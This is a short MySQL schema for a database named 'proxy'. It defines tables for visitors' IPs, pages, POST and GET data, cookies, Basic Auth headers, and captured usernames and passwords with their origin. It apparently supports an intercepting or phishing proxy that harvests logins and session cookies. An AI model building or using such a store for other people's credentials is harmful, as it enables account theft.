CREATE DATABASE proxy;
USE proxy;

CREATE TABLE movimietnos(
	id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    ip varchar(100),
    pagina varchar(100),
    post TEXT,
    gett TEXT,
    fechaHora DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE premium(
	id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    user varchar(100),
    pass varchar(100),
    pr INT(6)  
);

CREATE TABLE cookies(
	id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    keyy TEXT,
    val TEXT,
    fechaHora DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE BasicAuth(
    id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    Auth TEXT,
    Hash TEXT,
    fechaHora DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE credenciales(
	id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    ip varchar(100),
    origen TEXT,
    usuario TEXT,
    contrasena TEXT,
    fechaHora DATETIME DEFAULT CURRENT_TIMESTAMP
);

/*CREATE TABLE requests(
    id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    post TEXT,
    get TEXT,
    fechaHora DATETIME DEFAULT CURRENT_TIMESTAMP
);*/

